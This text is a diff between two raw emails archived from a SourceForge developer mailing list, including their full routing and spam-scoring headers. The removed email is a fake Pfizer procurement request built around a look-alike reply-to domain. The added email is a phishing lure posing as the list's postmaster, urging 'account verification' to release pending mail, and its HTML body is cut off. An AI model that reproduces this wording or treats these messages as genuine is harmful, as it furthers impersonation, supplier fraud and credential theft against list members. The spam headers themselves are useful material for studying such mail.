@@ -2,139 +2,106 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id sOwFCFe3nmnwWwQAu9opvQ
+	id YJS0Fasgn2lcZAQAu9opvQ
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	for <lists+industrypack-devel@lfdr.de>; Wed, 25 Feb 2026 09:48:23 +0100
+	for <lists+industrypack-devel@lfdr.de>; Wed, 25 Feb 2026 17:17:47 +0100
 X-Original-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 656E019462D
-	for <lists+industrypack-devel@lfdr.de>; Wed, 25 Feb 2026 09:48:22 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 6C27219A673
+	for <lists+industrypack-devel@lfdr.de>; Wed, 25 Feb 2026 17:17:46 +0100 (CET)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:List-Subscribe:
-	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:To:
-	Message-ID:Mime-Version:From:Date:Sender:Cc:Content-Transfer-Encoding:
+	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
+	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
+	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
 	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
-	bh=ADkfe17byfiHX+WI4GLG6wAANupvGBVDsT2BrgsG2W4=; b=ek9FXa6Da757/amz1idLvPNZnm
-	qVK/2xVOsKsiNTo8WXsadDs+DdGXcn7nbNHbxMEl94wTs8Ucs52Uh/iZSpEY0fBm6rBE6rTbryQIc
-	5AXJ319aXVHxLnn2hWX4jAkp10/KK5f0csqPrKDyphq7/1bmhKsZAMqZoYELB2bPckRU=;
-Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
-	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	bh=Ba0b5ar9XepvRDlmknTaGb21laz0MwiV4PWgVXTgOFg=; b=FwJ9Fuouo59jTQt+pjvejH9Wed
+	iHpPBqb2+8QhSZuN3B94AMSu0luSb6KW/MYhDOjuMKvNzdCe/uOgnBoQYNWpq3ziOnNAcLGbYWvcN
+	lbNahQ98+JZpnEPv9HCipEiaZyfMDu4u1Eh7/U4mv406R8ZQrJbuVJzI0qglRe86mhJ4=;
+Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
+	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1vvAZA-0005dF-1h
+	id 1vvHa3-0007iv-Pj
 	for lists+industrypack-devel@lfdr.de;
-	Wed, 25 Feb 2026 08:48:20 +0000
+	Wed, 25 Feb 2026 16:17:44 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
- by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
- TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
- <bounces+55480361-2ec8-industrypack-devel=lists.sourceforge.net@sendgrid.net>)
- id 1vvAZ9-0005d9-7A for industrypack-devel@lists.sourceforge.net;
- Wed, 25 Feb 2026 08:48:19 +0000
+ by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
+ (envelope-from <purchase@cheapassignment.com>) id 1vvHa2-0007in-6a
+ for industrypack-devel@lists.sourceforge.net;
+ Wed, 25 Feb 2026 16:17:43 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:
- Mime-Version:From:Date:Content-Type:Sender:Cc:Content-Transfer-Encoding:
- Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
- Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
- List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=MKQn7FeOocicCKlVUCK7KKXFOAondZtDKmv/zsUvqh4=; b=du77/lWZ/gMdQVae53WTzZra+v
- 10eo2eGqs2pdxDnFbT/ojK5UHSFjCw076sPm0KLPWNSAS78JbY1fSHTYjRP/99RtHNpuKgLdY8fiE
- GKIk22wH+0ZgqcpsXZdDM7j2+e/ijCPUrkgDL5nBfAtgu1tqgVdu83TWGmJVZwmaqiY4=;
+ d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
+ :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+ Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+ :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+ List-Subscribe:List-Post:List-Owner:List-Archive;
+ bh=r6l6agdx996iSYDQbmAFyhtVVZ8qtZBk8usJIYpHgzM=; b=k+dCTtoEjzTgerqNgeUrnzCQ+p
+ SWMXeTlSVOFHr0xHTVqETFWPrNVAbVS0PFhirNBbKF34w1t0GMTxFXZ49SXbGUz2A54ack8iEQSob
+ U0nEGEP5KCA/I43fEREsmZoS2WL8+TcHzInVD4v0d0tFV6bVMcJh0Cz3Fby5WbkhMctE=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:Mime-Version:From:Date:
- Content-Type:Sender:Cc:Content-Transfer-Encoding:Content-ID:
- Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
- :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
- List-Post:List-Owner:List-Archive;
- bh=MKQn7FeOocicCKlVUCK7KKXFOAondZtDKmv/zsUvqh4=; b=VRQzXRGYdZDhYZYiBxqHrVkJHE
- YgOXfxria7JiwhtIoNOdkxL9aBBXDPKC14Tc2TxeT/sn8Ick6znnMywx7Bk4C+CCyk6JosubEkn5v
- NCg+unPQmjJCZqLnLOe4JYXrFs9IdWUUsiqVlQ+VrgE1Lr7GBqWnxtZre0qYhTjysJ/0=;
-Received: from vsvhtrqv.outbound-mail.sendgrid.net ([134.128.117.72])
+ h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
+ Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
+ :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
+ List-Owner:List-Archive; bh=r6l6agdx996iSYDQbmAFyhtVVZ8qtZBk8usJIYpHgzM=; b=J
+ usm9s+LtA81zHMCDVRBpjcuTo3zuKAUZPngOVx4U0UtNZd0bRQdqv17liZIguDWfoTL5H6kumfZcs
+ 5WbICo9SbtM8hk42lYSWoUvjAotBcE6jl7Fj2qJRT02FhPYn2ucn5ZhUabB2jmzgZlmbnzhhbE+ZA
+ P77Bmw7dnz/ndwVQ=;
+Received: from mail.cheapassignment.com ([74.48.9.188])
  by sfi-mx-2.v28.lw.sourceforge.com with esmtps
- (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
- id 1vvAZ7-0002KB-8o for industrypack-devel@lists.sourceforge.net;
- Wed, 25 Feb 2026 08:48:18 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.net;
- h=content-type:date:from:mime-version:subject:reply-to:to:
- list-unsubscribe:list-unsubscribe-post:cc:content-type:date:from:subject:to;
- s=smtpapi; bh=MKQn7FeOocicCKlVUCK7KKXFOAondZtDKmv/zsUvqh4=;
- b=VDeSlRcJ4lne3c4k/FjTZSz9XO5/gASNKnZmtsR7Deg1YhO3Duz/soTrsXdgqhwu6Gof
- hkZYMB8X7rlzQMT8UrF3pzuh8Kl3Y3eA1xGynpFc1aTVulSwGini/C1NaZ+C57IOcQ/2iq
- EO68A9c/yOdKByFBmBCk6zW4MHzJhZ0Zg=
-Received: by recvd-665885f976-q5w65 with SMTP id
- recvd-665885f976-q5w65-1-699EB33A-A3
- 2026-02-25 08:30:50.983267892 +0000 UTC m=+5999075.320867716
-Received: from NTU0ODAzNjE (unknown) by geopod-ismtpd-45 (SG) with HTTP
- id DT5PixwSQIyTrzx3d6jASQ Wed, 25 Feb 2026 08:30:50.970 +0000 (UTC)
-Date: Wed, 25 Feb 2026 08:30:51 +0000 (UTC)
-From: Pfizer Procurement Manager <pfizer-supplies@outlook.com>
-Mime-Version: 1.0
-Message-ID: <DT5PixwSQIyTrzx3d6jASQ@geopod-ismtpd-45>
-X-SG-EID: =?us-ascii?Q?u001=2E0r8ZqO7zSzSda8tSE+E5kHcsZQXLKBr1H8TbgE=2F=2FzWBegXezovHo4o0mn?=
- =?us-ascii?Q?lobVCxSR753aDigtp6chFh17JQCtqA9uMvQcDKF?=
- =?us-ascii?Q?4FLc=2FvTGBj2fZN4jHklXN+ra7XMMTqTjzVAOZNi?=
- =?us-ascii?Q?mAx=2F2zjfAyPYsoJxD9QqBjkNTJQPkVwohTVPiFY?=
- =?us-ascii?Q?Zy7x993KHNHPcM6EPxB+wyw+AMbiVvy7WXpguv0?=
- =?us-ascii?Q?nV7z1SnsEtIfGhfjUYqLuv4HDkxXnauvtKgv0gb?=
- =?us-ascii?Q?tjh2O3xoJxzMgnAmNZ3NVBwl+XQzgUi98vdkKPC?=
- =?us-ascii?Q?72tfNl6E=3D?=
-X-SG-ID: =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
- =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
- =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FN=2FdSBSC?=
- =?us-ascii?Q?EDqhUtrHJHYvsfI4uiseGaBokyyhly+KdlhF7fB?=
- =?us-ascii?Q?nFJsu1KyWsr31VMPH4rMm0=2FSKazDYLTMILPfd4w?=
- =?us-ascii?Q?=2F1vvODAeTUwsa+2IaRIAOU4h2TOEJO09L1n7gXg?=
- =?us-ascii?Q?45wuAW9gmjtdpqVREGkPV7W0ZR9TUBSnfc3cHOU?=
- =?us-ascii?Q?BBFmmB2dHX9+tMki8dN1jyxRZQXQYdl+UH5Xemh?=
- =?us-ascii?Q?TwHQoj8tzH0kvkMQPW85O9r8qmtPB6m6r+zItPw?=
- =?us-ascii?Q?P3FAoAJRpBr2vBPiDsgVUX9v3YfxkIjef65oTI7?=
- =?us-ascii?Q?yZgFVc1lDz5Rrabl6eOldl2NcmQriC5z=2FEeW1Va?=
- =?us-ascii?Q?eqxCI6pffDxUNkJKcl=2FOyMnPIcBeEAhBmzW3Wu5?=
- =?us-ascii?Q?yhSCrcZ5dnWwnQR3FLhAunbC=2FFi7IHuP=2FeesUeJ?=
- =?us-ascii?Q?GY0HiPGlycCxQfrh55E+U=2FAVFzPeBOFp+puUUkH?=
- =?us-ascii?Q?RwBhrUFDz1oNejyMZp7oeO7WXi0q4Zc9Ft5xKop?=
- =?us-ascii?Q?meHTUmL=2Fez8i8NHdvM8AAFmCFGCwOGTE1z3L37F?=
- =?us-ascii?Q?wCv6jlxIMGxE5+31R2nAFkUsP8kgx9HmrKHrZOi?=
- =?us-ascii?Q?=2F0MOlD8z+YMS52c=2FHu2PNkIiOGiiWOlh3whqgWk?=
- =?us-ascii?Q?2cmiv6163QDd=2FfEpnMUz4EejzvmhgBcC6tUQvl8?=
- =?us-ascii?Q?tYMNkofhw?=
+ (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
+ id 1vvHa1-00027K-Si for industrypack-devel@lists.sourceforge.net;
+ Wed, 25 Feb 2026 16:17:42 +0000
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+ d=cheapassignment.com; s=dkim; h=Content-Transfer-Encoding:Content-Type:
+ MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+ Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+ :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+ List-Subscribe:List-Post:List-Owner:List-Archive;
+ bh=r6l6agdx996iSYDQbmAFyhtVVZ8qtZBk8usJIYpHgzM=; b=RuHFw7KEZyu/yq1J5C81RTat0/
+ H7Jy+yfEjkgoH1YlOztaC24PJqhv2eNty1wJB7050qGN22p3AkUG9wtsnPEC0xe3iW2C/GBzQecdF
+ 8av35zfD8hXpYaMe+tsMlfepq5nvxeNFC6rzWwdhO/eEIG0NQBXRONIWJ6olojaFKB8M=;
+Received: from [194.48.143.107]
+ by mail.cheapassignment.com with esmtpsa (TLS1.3) tls TLS_AES_256_GCM_SHA384
+ (Exim 4.99.1) (envelope-from <purchase@cheapassignment.com>)
+ id 1vvHZh-0000000047z-0Z9S
+ for industrypack-devel@lists.sourceforge.net;
+ Wed, 25 Feb 2026 11:17:21 -0500
 To: industrypack-devel@lists.sourceforge.net
-X-Entity-ID: u001.HqJueElCYm3SrqwGh6xwdQ==
-List-Unsubscribe-Post: List-Unsubscribe=One-Click
-X-Spam-Score: 2.7 (++)
+Date: 25 Feb 2026 08:17:11 -0800
+Message-ID: <20260225081711.F3CF9F43B802DCF0@cheapassignment.com>
+MIME-Version: 1.0
+X-SPF-Fail: YES
+X-Spam-Score: 4.3 (++++)
 X-Spam-Report: Spam detection software,
  running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
  has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  Good Day, Please source and submit a BID for the supply of
- the Pump Model attached below: Product: AEK-TurboStream Elite-BB2 Pump
- Quantity. 36 Pieces 
- Content analysis details:   (2.7 points, 5.0 required)
+ Content preview: Postmaster industrypack-devel@lists.sourceforge.net
+ Recipient: planning ; 
+ Content analysis details:   (4.3 points, 5.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 0.0 RCVD_IN_MSPIKE_H4      RBL: Very Good reputation (+4)
- [134.128.117.72 listed in wl.mailspike.net]
- 2.5 URIBL_CT_SURBL         Contains an URL listed in the CT SURBL blocklist
- [URI: u55480361.ct.sendgrid.net]
+ -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
+ domain
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
  not necessarily valid
  -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
  envelope-from domain
  -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
- 0.0 RCVD_IN_MSPIKE_WL      Mailspike good senders
- 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
- domains are different
- 0.0 FREEMAIL_FROM Sender email is commonly abused enduser mail provider
- [pfizer-supplies(at)outlook.com]
+ 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
- 0.0 HTML_EXTRA_CLOSE       BODY: HTML contains far too many close tags
- 0.0 FREEMAIL_FORGED_FROMDOMAIN 2nd level domains in From and EnvelopeFrom
- freemail headers are different
-X-Headers-End: 1vvAZ7-0002KB-8o
-Subject: [Industrypack-devel] =?utf-8?q?Request_for_Official_Quote_?=
- =?utf-8?q?=E2=80=93_AEK-TurboStream_Elite-BB2?=
+ 0.1 MXG_EMAIL_FRAG         BODY: URI with email in fragment
+ 2.0 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
+ 1.2 TVD_PH_SUBJ_META1      Email has a Phishy looking subject line
+ 1.1 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
+X-Headers-End: 1vvHa1-00027K-Si
+Subject: [Industrypack-devel] Account verification required -Release
+ Incoming pending mails!
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -146,198 +113,334 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: supplies@pfizer-inc.com
-Content-Type: multipart/mixed; boundary="===============7271226722294400277=="
+From: "lists.sourceforge.net via Industrypack-devel"
+ <industrypack-devel@lists.sourceforge.net>
+Reply-To: "lists.sourceforge.net" <purchase@cheapassignment.com>
+Content-Type: multipart/mixed; boundary="===============0234737233541720602=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [3.79 / 15.00];
-	URIBL_GREY(2.50)[sendgrid.net:url];
-	SUSPICIOUS_URL_IN_SUSPICIOUS_MESSAGE(1.00)[];
-	MID_RHS_NOT_FQDN(0.50)[];
-	MV_CASE(0.50)[];
+X-Spamd-Result: default: False [-1.31 / 15.00];
+	WHITELIST_DMARC(-7.00)[sourceforge.net:D:+];
+	DBL_SPAM(6.50)[cheapassignment.com:mid,cheapassignment.com:replyto];
 	RWL_MAILSPIKE_EXCELLENT(-0.40)[216.105.38.7:from];
 	MAILLIST(-0.20)[mailman];
 	R_DKIM_ALLOW(-0.20)[lists.sourceforge.net:s=beta];
 	BAD_REP_POLICIES(0.10)[];
-	DMARC_POLICY_SOFTFAIL(0.10)[outlook.com : SPF not aligned (relaxed), DKIM not aligned (relaxed),none];
-	MIME_GOOD(-0.10)[multipart/mixed,multipart/alternative,text/plain];
+	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	FREEMAIL_FROM(0.00)[outlook.com];
-	ARC_NA(0.00)[];
+	RCVD_COUNT_THREE(0.00)[4];
 	RCVD_TLS_LAST(0.00)[];
 	DKIM_MIXED(0.00)[];
-	MIME_TRACE(0.00)[0:+,1:+,2:+,3:~,4:+,5:+];
-	RCPT_COUNT_ONE(0.00)[1];
 	RECEIVED_HELO_LOCALHOST(0.00)[];
-	R_DKIM_REJECT(0.00)[sourceforge.net:s=x,sf.net:s=x,sendgrid.net:s=smtpapi];
-	CT_SURBL(0.00)[u55480361.ct.sendgrid.net:url];
-	REPLYTO_DOM_NEQ_FROM_DOM(0.00)[];
-	DKIM_TRACE(0.00)[lists.sourceforge.net:+,sourceforge.net:-,sf.net:-,sendgrid.net:-];
-	HAS_REPLYTO(0.00)[supplies@pfizer-inc.com];
-	TO_DN_NONE(0.00)[];
-	TAGGED_RCPT(0.00)[industrypack-devel];
-	RCVD_COUNT_FIVE(0.00)[5];
-	FROM_HAS_DN(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[pfizer-supplies@outlook.com,industrypack-devel-bounces@lists.sourceforge.net];
+	RCPT_COUNT_ONE(0.00)[1];
+	DMARC_POLICY_ALLOW(0.00)[lists.sourceforge.net,none];
+	TO_EQ_FROM(0.00)[];
+	NEURAL_SPAM(0.00)[0.997];
+	ARC_NA(0.00)[];
+	MIME_TRACE(0.00)[0:+,1:~,2:+,3:+];
+	SUBJECT_ENDS_EXCLAIM(0.00)[];
+	R_DKIM_REJECT(0.00)[sourceforge.net:s=x,sf.net:s=x,cheapassignment.com:s=dkim];
 	REPLYTO_DOM_NEQ_TO_DOM(0.00)[];
-	FORGED_SENDER_MAILLIST(0.00)[];
+	HAS_REPLYTO(0.00)[purchase@cheapassignment.com];
+	TAGGED_RCPT(0.00)[industrypack-devel];
 	R_SPF_ALLOW(0.00)[+ip4:216.105.38.7];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	REDIRECTOR_URL(0.00)[sendgrid.net];
-	NEURAL_SPAM(0.00)[0.957];
-	ASN(0.00)[asn:11320, ipnet:216.105.32.0/21, country:US];
+	TO_DN_NONE(0.00)[];
+	FROM_HAS_DN(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[industrypack-devel@lists.sourceforge.net,industrypack-devel-bounces@lists.sourceforge.net];
+	REPLYTO_DOM_NEQ_FROM_DOM(0.00)[];
+	RCVD_VIA_SMTP_AUTH(0.00)[];
 	MISSING_XM_UA(0.00)[];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[sendgrid.net:url,pfizer-inc.com:replyto,pfizer-inc.com:email,lists.sourceforge.net:rdns,lists.sourceforge.net:helo,lists.sourceforge.net:dkim]
-X-Rspamd-Queue-Id: 656E019462D
+	DKIM_TRACE(0.00)[lists.sourceforge.net:+,sourceforge.net:-,sf.net:-,cheapassignment.com:-];
+	ASN(0.00)[asn:11320, ipnet:216.105.32.0/21, country:US];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	FORGED_SENDER_MAILLIST(0.00)[];
+	DMARC_POLICY_ALLOW_WITH_FAILURES(0.00)[];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[www:url]
+X-Rspamd-Queue-Id: 6C27219A673
 X-Rspamd-Action: no action
 
---===============7271226722294400277==
-Content-Type: multipart/alternative; boundary=5944c7c95bacd7517dd70b5dda60aaa6f14adef6a15fd142bbbab1cc649c
-
---5944c7c95bacd7517dd70b5dda60aaa6f14adef6a15fd142bbbab1cc649c
+--===============0234737233541720602==
+Content-Type: text/html
 Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain; charset=us-ascii
-Mime-Version: 1.0
 
-Good Day,
-
-Please source and submit a BID for the supply of the Pump Model attached be=
-low:
-
-Product: AEK-TurboStream Elite-BB2 Pump
-Quantity. 36 Pieces
-
-Quotation should be submitted on or before: 01/03/2026
-
-Submit your official quote to this Email Address: supplies@pfizer-inc.com
-
-Thank you, and I look forward to your prompt response.
-
-Regards
-Adam Hudson
-Procurement Manager
-PFIZER MANUFACTURING BELGIUM (NV)
-Address: Rijksweg 12, 2870 Puurs-Sint-Amands, Belgium
-B.T.W : BE 0400.778.165
-Tel: +32 33320 151
-
-Unsubscribe Preferences ( https://u55480361.ct.sendgrid.net/asm/?user_id=3D=
-55480361&data=3D0aiKE6v2JWj1tBd0sRDErTSMh8Qte2mrhcFVYey0P0hoMDAwdTAwMG7m9Tf=
-3W4qxYFSSTQdUqMvJjTTBJfq_NkGfPVZ0rqP8CPVRYhJUo0QQ6q0inS89m2ErJS-Rk9JnsvMGKg=
-M8p8SOfqK3EvEKFeeBWat9l-4vMWkmHquDl-M-vlq8hYTknvqCBfMnehSvWi4gkJalguJbeXzZC=
-T-aL3lq9ZI8G5q86WyvbcAQGX39fEqVcZ4ZJETiERD6T6V-j_g_MDfcwZXiNi9fCmVQbFA-7SnY=
-ArNZuCdR-DdlgVTAAHrIcTJGzSL9MVTl_H-F84_1yDtWOohM8F4XoPmdalHoYDxreTqiY7L9MQV=
-rLLI189qmbu9xix25nbJtdSkSL8qD-5xx8a_f_z5v9TQsrGwkpRFHEd2NDNr2MBceUhVnqsvmGx=
-gOXacJ22nYfOpkso1ZZtgGdqNSy9idh2FOc_XxO4tTymZhbyxXzmrnOs-EYi9hCux9Zh211ZxmQ=
-yfDAurVyOJ71bU3x6wvFHQiIjxeT4kvRzOAZ24xStTZdXIBzinkFwrWCregdU5mUeybxq4YjYJo=
-a_FW8xvduwcAEcWxTlHiQ-6KVxQVPtad3huRGBE6LKbd6CcFKnhGBkXsYaBDaAbldGJFgL-I6Po=
-4Eb-dNOFEtwcQxgEBiNdAy9Bum9_PZQnddCbuAs_4OOQF4fPM0afNs2KOxc7ML8moJPOunk9CyP=
-6_czB5RZ8NjgLEd_Oe1H8V3FNsdi7hevDfksP5DpRui_MJ6_HdIoQJJNESfeQol0Cm5bl9ApfoT=
--Vw3BtrEWFTI9Vl6FzAt60wwM6u4Nfp-YcN8R2Giq2plKi_JZ5WwKkuYP5NUDztfgRTaMxZs-X0=
-K27vODv7kdD7xZE0kiBVHKjL75JbBbCswt32DCn-CenTiTcq6M834xvYSsW9bPmkAF0rXyr-2-_=
-TmdF7LUI7ThMbTOi8-Uf__fH4xZP2SnI_4_hiCIfsBOh73DOME7xwgAYFUJ2vp4vQRJNk0lpU70=
-sg_j3_k5b9RXopMtm2g-qy1wXKAStIQxF0CpBa1Q3Ouq-r4zqzJcLrCDl0GI20p3gOQHsBVYHvv=
-r9I_NCgokDNHm8i_v7jqDNkpJXwlYM1Tj31p02aV6_dnQwA3BapTUKUP7Pa0O7lfE8uwcJbZKng=
-E3b7mQUVw3V2G0_x8AqRhw=3D=3D )
---5944c7c95bacd7517dd70b5dda60aaa6f14adef6a15fd142bbbab1cc649c
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/html; charset=us-ascii
-Mime-Version: 1.0
-
-<html>
-
-<head>
-<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
-252">
-<title>New Page 1</title>
+<html><head>
+    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
 </head>
-
 <body>
+    <strong>    </strong><strong>
+        </strong><strong>
+            </strong>
+    <table width=3D"100%" style=3D'color: rgb(51, 51, 51); text-transform: =
+none; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial,=
+ Helvetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 4=
+00; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; text-siz=
+e-adjust: 100%; font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+        <tbody>
+            <tr>
+                <td class=3D"v1mceSpacing-24" valign=3D"top" style=3D"paddi=
+ng-right: 48px; padding-left: 48px; text-size-adjust: 100%;"><strong>
+                </strong>
+                    <div class=3D"v1mceText" style=3D'width: 564px; text-al=
+ign: center; color: rgb(0, 0, 0); padding-top: 0px; font-family: "Helvetica=
+ Neue", Helvetica, Arial, Verdana, sans-serif; font-size: 16px; border-top-=
+color: currentColor; border-top-width: 0px; border-top-style: none;'></div>=
 
-<p>Good Day,<br>
-<br>
-Please source and submit a BID for the supply of the Pump Model attached be=
-low:<br>
-&nbsp;<br>
-Product: AEK-TurboStream Elite-BB2 Pump<br>
-Quantity. 36 Pieces<br>
-<br>
-Quotation should be submitted on or before: 01/03/2026<br>
-<br>
-Submit your official quote to this Email Address:
-<a target=3D"_blank" href=3D"mailto:supplies@pfizer-inc.com">supplies@pfize=
-r-inc.com</a><br>
-<br>
-Thank you, and I look forward to your prompt response.<br>
-<br>
-Regards<br>
-Adam Hudson<br>
-Procurement Manager<br>
-PFIZER MANUFACTURING BELGIUM (NV)<br>
-Address: Rijksweg 12, 2870 Puurs-Sint-Amands, Belgium<br>
-B.T.W : BE 0400.778.165<br>
-Tel: +32 33320 151</p>
+                </td>
+            </tr>
+            <tr>
+                <td align=3D"center" class=3D"v1mceSpacing-24" valign=3D"to=
+p" style=3D"padding-top: 24px; padding-right: 48px; padding-left: 48px; tex=
+t-size-adjust: 100%;">
+                    <base class=3D" style=3D" href=3D"http://www.[Second]_[=
+Minute]_[Second]." valign=3D"top"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    <p style=3D"margin: 0px 0px 12px;"><span style=3D"font-=
+weight: bolder;"><br><br><br><br>&nbsp;Postmaster</span> &nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                        &nbsp;industrypack-devel@lists.sourceforge.net&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;<span>&nbsp;</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;
+                        <span style=3D"font-weight: bolder;">Recipient: pla=
+nning</span> &nbsp;
+                        <br></p>
+                    <table style=3D"padding: 0px; width: 557px; text-align:=
+ left; margin-right: auto; margin-left: auto; border-collapse: collapse; mi=
+n-height: 10px;" cellspacing=3D"0" cellpadding=3D"0">
+                        <tbody>
+                            <tr height=3D"10">
+                                <td width=3D"180" height=3D"10" style=3D"ma=
+rgin: 0px; padding: 0px; width: 180px; line-height: 10px; font-family: Robo=
